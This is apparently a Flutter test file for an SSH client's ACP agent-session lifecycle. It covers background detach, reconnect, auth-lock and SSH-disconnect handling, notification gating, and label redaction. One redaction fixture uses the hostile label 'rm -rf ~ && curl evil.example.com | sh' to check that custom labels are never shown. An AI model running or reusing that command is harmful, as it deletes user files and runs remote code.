// ignore_for_file: public_member_api_docs

import 'dart:async';
import 'dart:convert';

import 'package:drift/native.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:monkeyssh/data/database/database.dart';
import 'package:monkeyssh/domain/models/acp_provider.dart';
import 'package:monkeyssh/domain/models/acp_session_keys.dart';
import 'package:monkeyssh/domain/models/acp_session_state.dart';
import 'package:monkeyssh/domain/models/monkeymux_acp_bridge.dart';
import 'package:monkeyssh/domain/services/acp_bridge_connector.dart';
import 'package:monkeyssh/domain/services/acp_client.dart';
import 'package:monkeyssh/domain/services/acp_json_rpc_connection.dart';
import 'package:monkeyssh/domain/services/acp_lifecycle_service.dart';
import 'package:monkeyssh/domain/services/acp_provider_service.dart';
import 'package:monkeyssh/domain/services/acp_recent_sessions_service.dart';
import 'package:monkeyssh/domain/services/acp_session_manager.dart';
import 'package:monkeyssh/domain/services/acp_transport.dart';
import 'package:monkeyssh/domain/services/diagnostics_log_service.dart';
import 'package:monkeyssh/domain/services/local_notification_service.dart';
import 'package:monkeyssh/domain/services/monkeymux_installer_service.dart';
import 'package:monkeyssh/domain/services/settings_service.dart';

/// A minimal fake ACP agent transport: enough to open sessions, push
/// permission requests, and complete prompt turns.
class _FakeAcpServer implements AcpTransport {
  _FakeAcpServer({this.failInitialize = false});

  /// When true, `initialize` fails so a reconnect can be forced to fail.
  bool failInitialize;

  final _incoming = StreamController<List<int>>();
  int _sessionCounter = 0;
  int _serverRequestId = 0;
  bool closed = false;

  @override
  Stream<List<int>> get incoming => _incoming.stream;

  @override
  Future<void> write(List<int> bytes) async {
    final decoded = jsonDecode(utf8.decode(bytes).trim());
    final message = (decoded! as Map).cast<String, Object?>();
    final method = message['method'];
    final id = message['id'];
    if (id == null) return;

    switch (method) {
      case 'initialize':
        if (failInitialize) {
          _replyError(id, -32602, 'Invalid params');
          break;
        }
        _reply(id, {
          'protocolVersion': 1,
          'agentCapabilities': {
            'loadSession': false,
            'sessionCapabilities': {'resume': <String, Object?>{}},
          },
        });
      case 'session/new':
        _reply(id, {'sessionId': 'session-${++_sessionCounter}'});
      case 'session/resume':
        _reply(id, <String, Object?>{});
      case 'session/prompt':
        _reply(id, {'stopReason': 'end_turn'});
      default:
        _reply(id, <String, Object?>{});
    }
  }

  /// Pushes a `session/request_permission` server request.
  void requestPermission(String sessionId) {
    _push({
      'jsonrpc': '2.0',
      'id': 'srv-${++_serverRequestId}',
      'method': 'session/request_permission',
      'params': {
        'sessionId': sessionId,
        'toolCall': {'toolCallId': 't1', 'title': 'Write file'},
        'options': [
          {'optionId': 'allow', 'name': 'Allow', 'kind': 'allow_once'},
        ],
      },
    });
  }

  void _reply(Object? id, Object? result) =>
      _push({'jsonrpc': '2.0', 'id': id, 'result': result});

  void _replyError(Object? id, int code, String message) => _push({
    'jsonrpc': '2.0',
    'id': id,
    'error': {'code': code, 'message': message},
  });

  void _push(Map<String, Object?> message) {
    if (closed) return;
    _incoming.add(utf8.encode('${jsonEncode(message)}\n'));
  }

  @override
  Future<void> close() async {
    if (closed) return;
    closed = true;
    await _incoming.close();
  }
}

class _FakeConnector implements AcpBridgeConnector {
  _FakeConnector({this.serverFactory});

  final _FakeAcpServer Function(int hostId, String bridgeId)? serverFactory;
  final Map<String, _FakeAcpServer> servers = <String, _FakeAcpServer>{};
  final List<String> stoppedBridges = <String>[];
  final Set<String> availableBridges = <String>{};
  int _bridgeCounter = 0;

  @override
  Future<MonkeyMuxAcpBridgeStartResult> startBridge({
    required int hostId,
    required String providerId,
    required String providerLabel,
    required List<String> launchArgv,
    required String cwd,
    MonkeyMuxInstallConfirmation? confirmInstall,
  }) async {
    final bridgeId = 'bridge-${++_bridgeCounter}';
    availableBridges.add(bridgeId);
    return MonkeyMuxAcpBridgeStartResult(bridgeId: bridgeId);
  }

  @override
  Future<List<MonkeyMuxAcpBridgeMetadata>> listBridges(
    int hostId, {
    MonkeyMuxInstallConfirmation? confirmInstall,
  }) async => [
    for (final bridgeId in availableBridges)
      MonkeyMuxAcpBridgeMetadata(
        id: bridgeId,
        provider: 'Copilot CLI',
        commandHash: 'hash',
        state: MonkeyMuxAcpProviderState.running,
        clientCount: 0,
        pendingRequestCount: 0,
        inFlightTurnCount: 0,
        lastActivity: DateTime.now(),
        startedAt: DateTime.now(),
        nextSequence: 1,
      ),
  ];

  @override
  Future<String> resolveWorkingDirectory(
    int hostId,
    String cwd, {
    bool trustAbsolute = false,
  }) async => cwd;

  @override
  Future<MonkeyMuxAcpBridgeMetadata> bridgeStatus(
    int hostId,
    String bridgeId,
  ) async => MonkeyMuxAcpBridgeMetadata(
    id: bridgeId,
    provider: 'Copilot CLI',
    commandHash: 'hash',
    state: MonkeyMuxAcpProviderState.running,
    clientCount: 0,
    pendingRequestCount: 0,
    inFlightTurnCount: 0,
    lastActivity: DateTime.now(),
    startedAt: DateTime.now(),
    nextSequence: 1,
  );

  @override
  Future<void> stopBridge(int hostId, String bridgeId) async {
    stoppedBridges.add(bridgeId);
    availableBridges.remove(bridgeId);
  }

  @override
  AcpBridgeSession connect({
    required int hostId,
    required String bridgeId,
    required String providerId,
  }) {
    final server = serverFactory?.call(hostId, bridgeId) ?? _FakeAcpServer();
    servers[bridgeId] = server;
    final states = StreamController<MonkeyMuxAcpTransportState>.broadcast();
    final errors = StreamController<MonkeyMuxAcpBridgeException>.broadcast();
    final connection = AcpJsonRpcConnection(transport: server);
    final client = AcpClient(connection);
    return AcpBridgeSession(
      client: client,
      transportStates: states.stream,
      transportErrors: errors.stream,
      onClose: () async {
        // Lets a test pause a detach in flight (for example to race a
        // foreground resume against it) by holding the close open until the
        // test explicitly completes the gate.
        final gate = closeGates[bridgeId];
        if (gate != null) await gate.future;
        await client.close();
        await states.close();
        await errors.close();
      },
    );
  }

  /// Completers that gate [AcpBridgeSession.close] for a given bridge id,
  /// used only to deterministically reproduce detach-vs-foreground races.
  final Map<String, Completer<void>> closeGates = <String, Completer<void>>{};

  @override
  Future<AcpHostCapabilityBinding?> resolveCapabilityBinding(
    int hostId,
  ) async => null;
}

Future<void> _pump() => Future<void>.delayed(const Duration(milliseconds: 20));

void main() {
  late AppDatabase database;
  late SettingsService settings;
  late AcpProviderService providerService;
  late AcpRecentSessionsService recentSessions;
  late _FakeConnector connector;
  late AcpSessionManager manager;
  late LocalNotificationService notificationService;
  late Set<int> connectedHostIds;
  late bool isAuthUsable;
  late AcpLifecycleService lifecycle;

  Future<AcpSessionKey> startSession({required int hostId}) async {
    final result = await manager.startNewSession(
      hostId: hostId,
      providerId: AcpBuiltinProviderIds.copilotCli,
      cwd: '/repo',
    );
    return (result as AcpSessionLaunchStarted).key;
  }

  setUp(() {
    database = AppDatabase.forTesting(NativeDatabase.memory());
    settings = SettingsService(database);
    providerService = AcpProviderService(settings);
    recentSessions = AcpRecentSessionsService(settings);
    connector = _FakeConnector();
    connectedHostIds = <int>{1, 2};
    isAuthUsable = true;
    manager = AcpSessionManager(
      connector: connector,
      providerService: providerService,
      recentSessions: recentSessions,
      isProUnlocked: () => true,
      diagnostics: const NoopDiagnosticsLogger(),
    );
    notificationService = LocalNotificationService();
    lifecycle = AcpLifecycleService(
      sessionManager: manager,
      hasActiveSshSession: (hostId) => connectedHostIds.contains(hostId),
      notificationService: notificationService,
      isAuthUsable: () => isAuthUsable,
      diagnostics: const NoopDiagnosticsLogger(),
      backgroundDetachGrace: const Duration(milliseconds: 20),
    )..start();
  });

  tearDown(() async {
    await lifecycle.dispose();
    await manager.dispose();
    notificationService.dispose();
    await database.close();
  });

  group('background detach and foreground resume', () {
    test(
      'detaches live sessions only after the grace period elapses',
      () async {
        await startSession(hostId: 1);

        await lifecycle.handleBackground();
        expect(
          manager.state.sessions.single.status,
          isNot(AcpConnectionStatus.detached),
        );

        await Future<void>.delayed(const Duration(milliseconds: 60));
        expect(
          manager.state.sessions.single.status,
          AcpConnectionStatus.detached,
        );
      },
    );

    test(
      'never detaches on a transient background/foreground flicker',
      () async {
        await startSession(hostId: 1);

        await lifecycle.handleBackground();
        // Resumed well before the grace period elapses: a real device would
        // see this on a quick app-switcher glance or permission dialog.
        await Future<void>.delayed(const Duration(milliseconds: 5));
        await lifecycle.handleForeground();
        await Future<void>.delayed(const Duration(milliseconds: 60));

        expect(manager.state.sessions.single.status, AcpConnectionStatus.ready);
        expect(manager.state.sessions.single.isLive, isTrue);
      },
    );

    test('reconnects a session it auto-detached once foregrounded', () async {
      await startSession(hostId: 1);

      await lifecycle.handleBackground();
      await Future<void>.delayed(const Duration(milliseconds: 60));
      expect(
        manager.state.sessions.single.status,
        AcpConnectionStatus.detached,
      );

      await lifecycle.handleForeground();
      await _pump();

      expect(manager.state.sessions.single.status, AcpConnectionStatus.ready);
      expect(manager.state.sessions.single.isLive, isTrue);
    });

    test('reconnects immediately instead of stranding a session detached while '
        'the app already came back to the foreground mid-sweep', () async {
      final firstKey = await startSession(hostId: 1);
      final secondKey = await startSession(hostId: 2);

      // Gate host 1's detach so the test can resume the app while that
      // detach is still in flight, and never let host 2's detach begin
      // before the resume is observed.
      final gate = Completer<void>();
      connector.closeGates[firstKey.bridgeId] = gate;

      await lifecycle.handleBackground();
      await Future<void>.delayed(const Duration(milliseconds: 30));
      // The background sweep is now awaiting host 1's gated detach.

      // The user reopens the app while that detach is still in flight.
      final foregroundFuture = lifecycle.handleForeground();

      // Let the gated detach complete now that the app is foreground again.
      gate.complete();
      await foregroundFuture;
      await _pump();
      await _pump();

      // Host 1 must never be left stranded in a detached state once the
      // app is back in the foreground: it should be reconnected.
      expect(
        manager.state.byKeyValue(firstKey.value)!.status,
        AcpConnectionStatus.ready,
      );
      expect(manager.state.byKeyValue(firstKey.value)!.isLive, isTrue);
      // Host 2's detach must never have started once the app resumed.
      expect(
        manager.state.byKeyValue(secondKey.value)!.status,
        AcpConnectionStatus.ready,
      );
      expect(manager.state.byKeyValue(secondKey.value)!.isLive, isTrue);

      // A later foreground call must not find a stranded auto-detach entry
      // for host 1 either (it was reconnected immediately, not recorded).
      await lifecycle.handleForeground();
      await _pump();
      expect(
        manager.state.byKeyValue(firstKey.value)!.status,
        AcpConnectionStatus.ready,
      );
    });

    test('isolates a failed reconnect for one host from a healthy reconnect '
        'on another host', () async {
      final connectionCounts = <int, int>{};
      final failingConnector = _FakeConnector(
        serverFactory: (hostId, bridgeId) {
          final count = (connectionCounts[hostId] ?? 0) + 1;
          connectionCounts[hostId] = count;
          return _FakeAcpServer(failInitialize: hostId == 1 && count > 1);
        },
      );
      final failingManager = AcpSessionManager(
        connector: failingConnector,
        providerService: providerService,
        recentSessions: recentSessions,
        isProUnlocked: () => true,
        diagnostics: const NoopDiagnosticsLogger(),
      );
      addTearDown(failingManager.dispose);
      final failingLifecycle = AcpLifecycleService(
        sessionManager: failingManager,
        hasActiveSshSession: (hostId) => connectedHostIds.contains(hostId),
        notificationService: notificationService,
        diagnostics: const NoopDiagnosticsLogger(),
        backgroundDetachGrace: const Duration(milliseconds: 10),
      )..start();
      addTearDown(failingLifecycle.dispose);

      final firstResult = await failingManager.startNewSession(
        hostId: 1,
        providerId: AcpBuiltinProviderIds.copilotCli,
        cwd: '/repo',
      );
      final secondResult = await failingManager.startNewSession(
        hostId: 2,
        providerId: AcpBuiltinProviderIds.copilotCli,
        cwd: '/repo',
      );
      final firstKey = (firstResult as AcpSessionLaunchStarted).key;
      final secondKey = (secondResult as AcpSessionLaunchStarted).key;

      await failingLifecycle.handleBackground();
      await Future<void>.delayed(const Duration(milliseconds: 40));
      await failingLifecycle.handleForeground();
      await _pump();
      await _pump();

      // Host 1's new attachment fails initialization, but host 2 still
      // succeeds: one bad reconnect never blocks the other.
      expect(
        failingManager.state.byKeyValue(firstKey.value)!.status,
        isNot(AcpConnectionStatus.ready),
      );
      expect(
        failingManager.state.byKeyValue(secondKey.value)!.status,
        AcpConnectionStatus.ready,
      );
    });

    test('reconnects auto-detached sessions across multiple hosts', () async {
      await startSession(hostId: 1);
      await startSession(hostId: 2);

      await lifecycle.handleBackground();
      await Future<void>.delayed(const Duration(milliseconds: 60));
      expect(
        manager.state.sessions.every(
          (s) => s.status == AcpConnectionStatus.detached,
        ),
        isTrue,
      );

      await lifecycle.handleForeground();
      await _pump();

      expect(manager.state.sessions.every((s) => s.isLive), isTrue);
    });
  });

  group('auth lock cleanup', () {
    test(
      'detaches every live session without stopping remote bridges',
      () async {
        await startSession(hostId: 1);
        await startSession(hostId: 2);

        await lifecycle.handleAuthLocked();

        expect(
          manager.state.sessions.every(
            (s) => s.status == AcpConnectionStatus.detached,
          ),
          isTrue,
        );
        expect(connector.stoppedBridges, isEmpty);
      },
    );

    test('background -> lock -> resume never reconnects while still locked, '
        'and clears the pending auto-detach so it never reconnects later '
        'either', () async {
      final key = await startSession(hostId: 1);

      // Backgrounds and lets the grace period elapse so the session is
      // auto-detached and queued for a foreground reconnect.
      await lifecycle.handleBackground();
      await Future<void>.delayed(const Duration(milliseconds: 60));
      expect(
        manager.state.byKeyValue(key.value)!.status,
        AcpConnectionStatus.detached,
      );

      // Auto-lock fires while still backgrounded (or just as the app
      // resumes): auth becomes unusable and any pending auto-detach intent
      // must be cleared/suppressed.
      isAuthUsable = false;
      await lifecycle.handleAuthLocked();

      // The app comes back to the foreground, but the user has not
      // unlocked yet: reconnecting now would attach a live client to a
      // session behind a lock screen.
      await lifecycle.handleForeground();
      await _pump();
      expect(
        manager.state.byKeyValue(key.value)!.status,
        AcpConnectionStatus.detached,
      );
      expect(manager.state.byKeyValue(key.value)!.isLive, isFalse);

      // Unlocking alone (without another real foreground transition) must
      // not silently reconnect a session whose auto-detach was already
      // cleared by the lock.
      isAuthUsable = true;
      await _pump();
      expect(
        manager.state.byKeyValue(key.value)!.status,
        AcpConnectionStatus.detached,
      );
    });
  });

  group('SSH disconnect cleanup', () {
    test('detaches only the session whose host lost its SSH session', () async {
      await startSession(hostId: 1);
      await startSession(hostId: 2);

      connectedHostIds.remove(1);
      await lifecycle.handleSshConnectivityChanged();

      final byHost = {for (final s in manager.state.sessions) s.key.hostId: s};
      expect(byHost[1]!.status, AcpConnectionStatus.detached);
      expect(byHost[2]!.status, AcpConnectionStatus.ready);
      expect(connector.stoppedBridges, isEmpty);
    });
  });

  group('notification gating', () {
    test('never notifies while the app is in the foreground', () async {
      final key = await startSession(hostId: 1);
      final taps = <AcpNotificationPayload>[];
      notificationService.acpNotificationTaps.listen(taps.add);

      connector.servers.values.single.requestPermission(
        manager.state.byKeyValue(key.value)!.key.acpSessionId,
      );
      await _pump();

      // Foreground by default; no notification should have been requested.
      // We can't directly observe `showAcpNotification` without a plugin,
      // but we can confirm no tap stream activity occurs from a shown
      // notification (there is nothing to tap because nothing was shown).
      expect(taps, isEmpty);
    });

    test(
      'never notifies while backgrounded with no SSH path to the host',
      () async {
        final key = await startSession(hostId: 1);
        await lifecycle.handleBackground();
        connectedHostIds.remove(1);

        connector.servers.values.single.requestPermission(
          manager.state.byKeyValue(key.value)!.key.acpSessionId,
        );
        await _pump();

        // No exception and no crash is the primary contract here; there is
        // no host SSH path so no notification could ever be delivered.
      },
    );
  });

  group('disposal', () {
    test('cancels the background timer and state subscription', () async {
      await startSession(hostId: 1);
      await lifecycle.handleBackground();
      await lifecycle.dispose();

      // Waiting past the grace period must not detach anything once disposed.
      await Future<void>.delayed(const Duration(milliseconds: 60));
      expect(manager.state.sessions.single.status, AcpConnectionStatus.ready);
    });

    test('dispose is idempotent', () async {
      await lifecycle.dispose();
      await lifecycle.dispose();
    });
  });

  group('notification label redaction', () {
    AcpSessionState fixture({
      required String providerId,
      required bool isCustomProvider,
    }) {
      final now = DateTime.now();
      return AcpSessionState(
        key: AcpSessionKey.of(
          hostId: 1,
          providerId: providerId,
          bridgeId: 'bridge-1',
          acpSessionId: 'session-1',
        ),
        providerLabel: 'rm -rf ~ && curl evil.example.com | sh',
        isCustomProvider: isCustomProvider,
        cwd: '/repo',
        status: AcpConnectionStatus.ready,
        createdAt: now,
        lastActivityAt: now,
      );
    }

    test('uses the fixed built-in label for a built-in provider', () {
      expect(
        acpSafeAgentDisplayLabel(
          fixture(
            providerId: AcpBuiltinProviderIds.copilotCli,
            isCustomProvider: false,
          ),
        ),
        'Copilot CLI',
      );
      expect(
        acpSafeAgentDisplayLabel(
          fixture(
            providerId: AcpBuiltinProviderIds.openCode,
            isCustomProvider: false,
          ),
        ),
        'OpenCode',
      );
    });

    test('never uses a custom/user-controlled provider label, even one that '
        'looks like a shell command', () {
      final label = acpSafeAgentDisplayLabel(
        fixture(providerId: 'custom-provider-id', isCustomProvider: true),
      );
      expect(label, acpGenericAgentLabel);
      expect(label, isNot(contains('rm -rf')));
      expect(label, isNot(contains('curl')));
    });

    test('falls back to the generic label for an unrecognized non-custom '
        'provider id', () {
      expect(
        acpSafeAgentDisplayLabel(
          fixture(
            providerId: 'builtin:future-provider',
            isCustomProvider: false,
          ),
        ),
        acpGenericAgentLabel,
      );
    });
  });
}
